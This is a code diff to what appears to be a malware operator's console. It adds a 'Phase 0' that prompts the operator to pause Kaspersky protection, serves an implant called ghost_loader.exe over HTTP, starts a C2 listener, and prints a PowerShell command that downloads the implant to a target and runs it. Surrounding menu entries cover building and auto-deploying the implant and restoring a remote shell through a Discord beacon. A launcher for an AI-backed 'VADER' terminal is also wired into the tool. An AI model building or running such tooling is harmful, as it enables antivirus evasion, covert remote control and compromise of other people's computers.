@@ -227,6 +227,7 @@ def render():
     print(f"  {RED}{BOLD}  PHASE 3 — DEPLOY{RST}")
     print(hline("─"))
     deploy_ops = [
+        ("P", "Phase 0",        "Pre-op: KAV pause + file server + C2", RED),
         ("B", "Build Implant",  "Sync token + rebuild + serve",      CYAN),
         ("A", "Auto Deploy",    "Compile + ship implant to target",  RED),
         ("R", "TCP Reconnect",  "Ghost re-deliver via Discord beacon (KAV-safe)", AMBER),
@@ -567,6 +568,40 @@ def scan_reminder():
     print(f"  {DIM}    python deploy.py --status  — checks all binaries including ghost_loader.exe{RST}\n")
 
 
+def _phase0_launch():
+    """Phase 0 pre-op: prompt KAV pause, start file server, launch C2."""
+    import threading
+    from http.server import HTTPServer, SimpleHTTPRequestHandler
+    import functools
+
+    print(f"\n  {RED}{BOLD}╔══ PHASE 0 — PRE-OP ══╗{RST}")
+    print(f"  {AMBER}  1. Pause Kaspersky: right-click tray → Pause Protection → Until restart{RST}")
+    print(f"  {DIM}     (skip if exclusions already set for Desktop/cheyanne){RST}")
+    input(f"\n  {WHITE}  Press Enter when ready...{RST}")
+
+    my_ip = detect_lan_ip() or "192.168.1.92"
+
+    handler = functools.partial(SimpleHTTPRequestHandler, directory=ROOT)
+    handler.log_message = lambda *a: None
+    try:
+        srv = HTTPServer(("0.0.0.0", 8890), handler)
+        t = threading.Thread(target=srv.serve_forever, daemon=True)
+        t.daemon = True
+        t.start()
+        print(f"\n  {GREEN}[OK]{RST} File server: http://{my_ip}:8890/")
+        print(f"  {DIM}     Payload: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
+    except OSError:
+        print(f"  {AMBER}[!]{RST}  Port 8890 already in use — file server running elsewhere")
+
+    print(f"  {GREEN}[OK]{RST} C2 listener: 0.0.0.0:4443")
+    print(f"  {DIM}     Physical access: drop + run shell/ghost_loader.exe on target{RST}")
+    print(f"  {DIM}     Remote: iwr http://{my_ip}:8890/shell/ghost_loader.exe -OutFile C:\\Users\\Public\\g.exe; Start-Process C:\\Users\\Public\\g.exe{RST}")
+    print()
+
+    c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
+    subprocess.run([sys.executable, c2_v2], cwd=ROOT)
+
+
 def _tcp_reconnect_via_discord():
     """Re-deliver ghost_loader_v3 via live Discord beacon to restore TCP shell."""
     import socket as _sock
@@ -727,6 +762,8 @@ def run_op(choice):
             subprocess.run([sys.executable, auto_test], cwd=ROOT)
         else:
             print(f"\n  {RED}[!] auto_screenshot_test.py not found{RST}")
+    elif choice.lower() == "p":
+        _phase0_launch()
     elif choice.lower() == "r":
         _tcp_reconnect_via_discord()
     elif choice.lower() == "z":
@@ -740,18 +777,13 @@ def run_op(choice):
     elif choice.lower() == "i":
         convert_image()
     elif choice.lower() == "h":
-        agent_script = os.path.join(ROOT, "cheyanne_agent.py")
-        if os.path.exists(agent_script):
-            model_arg = ""
-            choice_b = input(f"\n  {PINK}  Backend? [o]llama / [k]imi / [c]laude (default: ollama): {RST}").strip().lower()
-            if choice_b == "c":
-                subprocess.run([sys.executable, agent_script, "--claude"], cwd=ROOT)
-            elif choice_b == "k":
-                subprocess.run([sys.executable, agent_script, "--kimi"], cwd=ROOT)
-            else:
-                subprocess.run([sys.executable, agent_script], cwd=ROOT)
-        else:
-            print(f"\n  {RED}[!] cheyanne_agent.py not found{RST}")
+        vader_root = r"C:\Users\gwu07\22DIV"
+        vader_py   = os.path.join(vader_root, ".venv", "Scripts", "python.exe")
+        if not os.path.exists(vader_py):
+            vader_py = sys.executable
+        env = {**os.environ, "PYTHONPATH": vader_root}
+        print(f"\n  {PINK}[*] Launching 22DIV VADER terminal (sonnet-4-6)...{RST}")
+        subprocess.run([vader_py, "-m", "vader.terminal"], cwd=vader_root, env=env)
 
     # ── PHASE 4: OPERATE ──
     elif choice.lower() == "s" and HAS_OPS:
